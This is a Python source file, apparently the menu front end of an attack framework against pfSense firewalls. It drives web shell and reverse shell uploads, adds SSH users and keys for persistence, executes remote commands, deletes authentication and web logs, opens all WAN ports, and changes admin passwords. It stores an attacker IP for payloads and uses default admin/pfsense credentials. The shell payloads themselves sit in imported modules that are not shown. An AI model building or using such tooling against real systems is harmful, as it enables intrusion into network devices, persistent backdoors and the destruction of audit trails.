from Shells import Shells
from Shells.Levels import Skidy, Amateur, Pro

from Utils.Utils import get_ip, get_url

from Extras.Logs import remove_logs
from Extras.RemoveUser import remove_user
from Extras.Rules import enable_all_wan
from Extras.ConsolePass import toggle_console_pass
from Extras.ChangeAdmin import change_admin_password

import Utils.Splash
import Utils.Target as Target
import Utils.Ssh as Ssh
import Utils.Database

from simple_term_menu import TerminalMenu
from random import choice as rchoice
from termcolor import cprint
from ipaddress import ip_address


# Styling
CURSOR_COLOURS = ["bg_black", "bg_blue" ,"bg_cyan", "bg_gray", "bg_green"
                  , "bg_purple", "bg_red", "bg_yellow", "fg_black", "fg_blue"
                  , "fg_cyan" , "fg_gray", "fg_green", "fg_purple", "fg_red"
                  , "fg_yellow" 
                  ]
CURSOR_TYPE = ["bold", "italics", "standout", "underline"]
CONFIRM = ["yes", "no"]

# Menus
TOP_MENU = ["Select Target", "Web Shells", "Reverse Shells", "SSH", "Extras", "Settings", "Exit"]

# Shells
WS_MENU = ["Upload a Web Shell", "Access a Web Shell", "Back"]
RS_MENU = ["Upload a Reverse Shell", "Access a Reverse Shell", "Back"]
LVL_SELECT = ["Skidy", "Amateur", "Pro"]

# Rest
#BD_MENU = ["SSH Backdoors", "Full Web Backdoor", "Back"]
SSH_MENU = ["Toggle SSH", "Add SSH User", "Setup User Keys", "Execute CMDs via SSH", "Copy Files to/from Pfsense", "Back"]
EXTRAS_MENU = ["Remove Auth/Web Logs", "Enable all WAN ports", "Check for Logged in Users", "Enable Console Password", "Change Admin Password", "Back"]
SET_MENU = ["Show All Settings", "Change Name", "Change IP", "Change URL", "Change Username", "Change Password", "Add Firewall", "Delete Firewall", "Change Attacker","Back"]
DIRECTION = ["Upload", "Download"]

class Menu():
    def __init__(self) -> None:
        self.target = Target.Target()
        self.dbConn = Utils.Database()
        self.targets = None
        self.targetId = None
        self.settingsId = None
        self.targetName = "None"
        self.all = False
        self.DEBUG = False
        self.newSession = None
        self.journey = []
        self.user = ""
        self.__start_menu()

    def confirm_choice(self, question:str) -> bool:
        """
        """
        cprint(question, "yellow")
        choice = self.__display_menu(CONFIRM)
        # 0 = yes, 1 = no
        if(choice == 0): return True
        else: return False
    

    def __cmd_choice(self) -> None:
        choice = "" 

        while(choice.lower() != "quit"):
            # Attacking: https://192.168.189.145
            cprint("Attacking: ", "yellow", end="") 
            cprint(f"{self.newSession.targetUrl}", "blue")
            # Type 'quit' to exit
            cprint("Type '", "green", end="")
            cprint("quit", "yellow", end="")
            cprint("' to exit", "green")
            # CMD: 
            cprint("CMD", "blue", end="")
            cprint(": ", "white", end="")

            choice = input()
            if(choice.lower() == "quit"): return 
            Ssh.cmd_ssh(self.newSession, self.user, choice)


    def __print_firewall(self, firewall:tuple):
        headers = {"Firewall Settings":firewall.name,
                   "ID":firewall.id,
                   "IP":firewall.ip,
                   "URL":firewall.url,
                   "PFIPPATH":firewall.pfippath,
                   "Username":firewall.username,
                   "Password":firewall.password
                   }
        for k, v in headers.items():
            cprint(f"{k}", "blue", end="")
            cprint(": ", "white", end="")
            cprint(f"{v}", "yellow")

    def __select_attack(self, level, type, id, login:bool=True):
        self.newSession = self.target.get_session(id, login)

        # If login failed
        if not (self.newSession.loggedIn):
            if(self.DEBUG): print("[+] Attack Login Failed")
            # If u wanted a login
            if (login):
                if(self.DEBUG): print("[+] But I wanted one!")
                return 

        ## Shells
        if(level == "skidy"):
            if(self.DEBUG): print("[+] Skidy Attack")
            skidy = Skidy.Skidy(self.newSession)
            if(type == "webshell"): skidy.skidy_web()
            if(type == "revshell"): skidy.skidy_rev()
        elif(level == "amateur"):
            if(self.DEBUG): print("[+] Amateur Attack")
            amateur = Amateur.Amateur(self.newSession)
            if(type == "webshell"): amateur.amateur_web()
            if(type == "revshell"): amateur.amateur_rev()
        elif(level == "pro"):
            if(self.DEBUG): print("[+] Pro Attack")
            pro = Pro.Pro(self.newSession)
            if(type == "webshell"): pro.pro_web()
            if(type == "revshell"): pro.pro_rev()

        ## SSH
        if(level == "toggleSSH"):
            Ssh.toggle_ssh(self.newSession)
        elif(level == "addSSH"):
            Ssh.add_ssh_user(self.newSession)
        elif(level == "sshKeys"):
            Ssh.add_ssh_key(self.newSession)
        elif(level == "cmd_ssh"):
            users = self.target.get_users(self.newSession, self.newSession.targetIp)
            ## Basically no users to use
            if not(users): return TOP_MENU

            userId = self.__display_menu(users) + 1
            userId = (users[userId-1]).split(':')[0] # This is a terrible fix
            self.user = self.target.get_user_from_id(userId)
            self.__cmd_choice()
        elif(level == "sshcopy"):
            users = self.target.get_users(self.newSession, self.newSession.targetIp)
            ## Basically no users to use
            if not(users): return TOP_MENU

            userId = self.__display_menu(users) + 1
            userId = (users[userId-1]).split(':')[0] # This is a terrible fix
            self.user = self.target.get_user_from_id(userId)
            directionId = self.__display_menu(DIRECTION)
            Ssh.transfer_file(self.newSession, self.user, directionId)


        ## Extras
        if(level == "Remove Auth/Web Logs"):
            remove_logs(self.newSession)
        elif(level == "Enable all WAN ports"):
            enable_all_wan(self.newSession)
        elif(level == "Check for Logged in Users"):
            remove_user(self.newSession, self)
        elif(level == "Enable Console Password"):
            toggle_console_pass(self.newSession)
        elif(level == "Change Admin Password"):
            change_admin_password(self.newSession)


        

    def __target_attack(self, level:str, type:str=None, login:bool=True) -> None:
        ## Attacks multipe or 1
        if(self.all):
            for firewall in range(len(self.targets)-1):
                self.__select_attack(level, type, firewall+1, login)
            self.all = False
        else:
            self.__select_attack(level, type, self.targetId, login)  


    def __end_select(self) -> None:
        if("Back" in self.journey):
            if(self.DEBUG): print("[+] Wiping Journey!")
            self.journey = []
            return
        if(self.targetId == None and self.settingsId == None):
            cprint("No Target Selected!", "red")
            return
        if(self.targetId == "99"): self.all = True

        # Debug Prints
        if(self.DEBUG): print(f"[+] Journey: {self.journey}")
        if(self.DEBUG): print(f"[+] TargetId: {self.targetId}")

        #### Skidy
        if("Skidy" in self.journey):
            if("Upload a Web Shell" in self.journey):
                self.__target_attack("skidy", "webshell")
            elif("Upload a Reverse Shell" in self.journey):
                self.__target_attack("skidy", "revshell")
            elif("Access a Web Shell" in self.journey):
                print("WS THIS SHOULD SPAWN A FUNCTION TO GET ALL AVAILABLE WEB SHELLS")
            elif("Access a Reverse Shell" in self.journey):
                print("WR THIS SHOULD SPAWN A FUNCTION TO GET ALL AVAILABLE REVERSE SHELLS")
        #### Amateur
        elif("Amateur" in self.journey):
            if("Upload a Web Shell" in self.journey):
                self.__target_attack("amateur", "webshell")
            elif("Upload a Reverse Shell" in self.journey):
                self.__target_attack("amateur", "revshell")
            elif("Access a Web Shell" in self.journey):
                print("WA THIS SHOULD SPAWN A FUNCTION TO GET ALL AVAILABLE WEB SHELLS")
            elif("Access a Reverse Shell" in self.journey):
                print("RA THIS SHOULD SPAWN A FUNCTION TO GET ALL AVAILABLE REVERSE SHELLS")
        #### Pro
        elif("Pro" in self.journey):
            if("Upload a Web Shell" in self.journey):
                self.__target_attack("pro", "webshell")
            elif("Upload a Reverse Shell" in self.journey):
                self.__target_attack("pro", "revshell")
            elif("Access a Web Shell" in self.journey):
                print("WP THIS SHOULD SPAWN A FUNCTION TO GET ALL AVAILABLE WEB SHELLS")
            elif("Access a Reverse Shell" in self.journey):
                print("RP THIS SHOULD SPAWN A FUNCTION TO GET ALL AVAILABLE REVERSE SHELLS")

        #### SSh
        if("Toggle SSH" in self.journey):
            self.__target_attack("toggleSSH")
        elif("Add SSH User" in self.journey):
            self.__target_attack("addSSH")
        elif("Setup User Keys" in self.journey):
            self.__target_attack("sshKeys")
        elif("Execute CMDs via SSH" in self.journey):
            self.__target_attack("cmd_ssh", login=False)
        elif("Copy Files to/from Pfsense" in self.journey):
            self.__target_attack("sshcopy", login=False)


        #### Extras
        if("Remove Auth/Web Logs" in self.journey):
            self.__target_attack("Remove Auth/Web Logs", login=False)
        elif("Enable all WAN ports" in self.journey):
            self.__target_attack("Enable all WAN ports", login=False)
        elif("Check for Logged in Users" in self.journey):
            self.__target_attack("Check for Logged in Users", login=False)
        elif("Enable Console Password" in self.journey):
            self.__target_attack("Enable Console Password")
        elif("Change Admin Password" in self.journey):
            self.__target_attack("Change Admin Password")

        #### Settings
        if("Show All Settings" in self.journey):
            firewall = self.dbConn.get_firewall(self.settingsId)
            self.__print_firewall(firewall)
        elif("Change Name" in self.journey):
            cprint("Enter Name: ", "cyan", end="")
            name = input()
            self.dbConn.change_row("firewalls", "name", name, "id", self.settingsId)
            self.settingsId = None
        elif("Change IP" in self.journey):
            ip = get_ip("Firewall")
            self.dbConn.change_row("firewalls", "ip", ip, "id", self.settingsId)
            self.settingsId = None
        elif("Change URL" in self.journey):
            url = get_url("Firewall")
            self.dbConn.change_row("firewalls", "url", url, "id", self.settingsId)
            self.settingsId = None
        elif("Change Username" in self.journey):
            cprint("Enter Username: ", "cyan", end="")
            username = input()
            self.dbConn.change_row("firewalls", "username", username, "id", self.settingsId)
            self.settingsId = None
        elif("Change Password" in self.journey):
            cprint("Enter Password: ", "cyan", end="")
            password = input()
            self.dbConn.change_row("firewalls", "password", password, "id", self.settingsId)
            self.settingsId = None
        elif("Add Firewall" in self.journey):
            new_input = DatabaseInputMenu()
            data = new_input.get_firewall()
            self.dbConn.set_firewall(data)
        elif("Delete Firewall" in self.journey):
            firewallId = self.__display_menu(self.targets) + 1
            choice = self.confirm_choice("Delete Firewall?")
            if(choice):
                cprint("Deleting Firewall", "yellow")
                self.dbConn.del_firewall(firewallId)
            else:
                cprint("Firewall Spared!", "blue")
        elif("Change Attacker" in self.journey):
            new_input = DatabaseInputMenu()
            data = new_input.get_attacker()
            self.dbConn.set_attacker(data)
            
        # Wipe journey
        if(self.DEBUG): print("[+] Wiping Journey!")
        self.journey = []


    def __next_menu(self, currentItem:str) -> list:
        # match doesn't allow stuff like TOP_MENU[0]
        match currentItem:
            case "Select Target":
                # Get targets, if empty return
                self.targets = self.target.get_targets()
                if not(self.targets): return TOP_MENU
                self.targetId = self.__display_menu(self.targets) + 1

                ## All targets or just 1
                if("All Targets" in self.targets[self.targetId - 1]):
                    self.targetName = "All Targets"
                    self.targetIp = None
                    self.targetId = self.targets[self.targetId - 1].split(':')[0].strip()
                else:
                    self.targetName = self.targets[self.targetId - 1].split(':')[1].strip()
                    self.targetIp = self.targets[self.targetId - 1].split(':')[2].strip()
                # Debug printing
                if(self.DEBUG): print(f"[+] Targets: {self.targets}")
                if(self.DEBUG): print(f"[+] TargetID: {self.targetId}")
                if(self.DEBUG): print(f"[+] TargetName: {self.targetName}")
                if(self.DEBUG): print(f"[+] TargetIp: {self.targetIp}")
                return TOP_MENU
            case "Web Shells":
                return WS_MENU
            case "Upload a Web Shell":
                return LVL_SELECT
            case "Access a Web Shell":
                shells = self.target.get_shells("webshells")
                if not(shells): return TOP_MENU
                shellId = self.__display_menu(shells) + 1
                newShell = Shells.Shells(self.newSession)
                newShell.access_webshell(shellId)
                return TOP_MENU
            case "Reverse Shells":
                return RS_MENU
            case "Upload a Reverse Shell":
                return LVL_SELECT
            case "Access a Reverse Shell":
                shells = self.target.get_shells("revshells")
                if not(shells): return TOP_MENU
                shellId = self.__display_menu(shells) + 1
                newShell = Shells.Shells(self.newSession)
                newShell.access_revshell(shellId)
                return TOP_MENU
            #case "Backdoors":
            #    return BD_MENU
            case "SSH":
                return SSH_MENU
            case "Extras":
                return EXTRAS_MENU
            case "Settings":
                self.targets = self.target.get_targets()
                # Remove all from list
                self.targets = self.targets[:-1]
                self.settingsId = self.__display_menu(self.targets) + 1
                return SET_MENU
            case _:
                self.__end_select()
                return TOP_MENU
        

    # Literally just displaying, don't need to look at it.
    def __display_menu(self, menu:list) -> str:
        """Displays menu based off list

        Args:
            self:
                Self object
            menu:
                A list of command seperate menu strings

        Returns:
            str: A string of the users choice

        """
        # Constructor for the TerminalMenu class is given random item for colour and type
        terminalMenu = TerminalMenu(menu, menu_cursor_style=(rchoice(CURSOR_COLOURS), rchoice(CURSOR_TYPE)))
        menuEntryIndex = terminalMenu.show()

        return menuEntryIndex


    def __start_menu(self) -> None:
        currentMenu = TOP_MENU

        # Get users choice from menu
        choice = self.__display_menu(currentMenu)
        
        while(True):
            Utils.Splash.display_splash()

            if(currentMenu[choice] == "Exit"):
                break

            # Move to the next appropriate menu
            currentMenu = self.__next_menu(currentMenu[choice])

            # Displays the selected target
            cprint("Target", "yellow", end="")
            cprint(": ", "white", end="")
            cprint(f"{self.targetName}", "blue")

            choice = self.__display_menu(currentMenu)

            # Keep journey of menu options clicked, will reset on main menu
            self.journey.append(currentMenu[choice])


class DatabaseInputMenu():
    def get_attacker(self) -> list:
        # User inputs
        ip = get_ip("Attacker")
        iplong = str(int(ip_address(ip)))
        # Splitting IP for converting to hex
        a = ip.split('.')
        iphex = "0x" + '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, a))

        # Add to data to pass to SQL
        data = [ip]
        data.append(iplong)
        data.append(iphex)

        # Sql yeah
        return data


    def get_firewall(self) -> list:
        ip = ""
        url = ""
        name = ""

        # User inputs
        # Checks that the user is not giving a blank name
        while not(name):
            cprint("Enter Firewall Name: ", "yellow", end="")
            name = input()
            # Check the user is just inputiting spaces
            if(name.isspace()):
                cprint("Realllyyy..?? Spaces", "red")
                name = ""

        ip = get_ip("Firewall")
        
        # Checks that the user is giving a valid URL
        url = get_url("Firewall")

        pfippath = ""
        username = "admin"
        password = "pfsense"

        # Add to data to pass to SQL
        data = [name]
        data.append(ip)
        data.append(url)
        data.append(pfippath)
        data.append(username)
        data.append(password)

        # Sql yeah
        return data